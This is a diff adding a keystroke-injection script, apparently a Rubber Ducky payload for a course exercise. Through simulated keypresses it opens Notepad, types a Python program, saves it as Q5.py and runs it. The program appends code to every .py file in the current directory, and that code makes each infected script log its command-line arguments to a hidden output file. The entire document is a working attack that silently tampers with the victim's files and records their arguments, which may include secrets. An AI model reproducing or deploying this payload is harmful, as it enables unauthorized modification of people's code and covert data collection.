@@ -1,0 +1,34 @@
+DEFAULT_DELAY 1250
+GUI r
+STRING notepad.exe
+ENTER
+STRING import os
+ENTER
+STRING if __name__ == "__main__":
+ENTER
+TAB
+STRING E=[A for A in os.listdir() if A[-3:]=='.py'];B="\n    import sys\n    with open('Q1C.out', 'a') as f:\n        f.write(' '.join(sys.argv) + '\\n')";F='if __name__ == "__main__":'
+ENTER
+TAB
+STRING for C in E:
+ENTER
+TAB
+TAB
+STRING with open(C,'r')as A:D=A.read()
+ENTER
+TAB
+TAB
+STRING if F in D and B not in D:
+ENTER
+TAB
+TAB
+TAB
+STRING with open(C,'a')as A:A.write(B+'\n')
+CTRL s
+STRING Q5.py
+ENTER
+GUI r
+STRING cmd.exe
+ENTER
+STRING python OneDrive\Documents\Q5.py
+ENTER
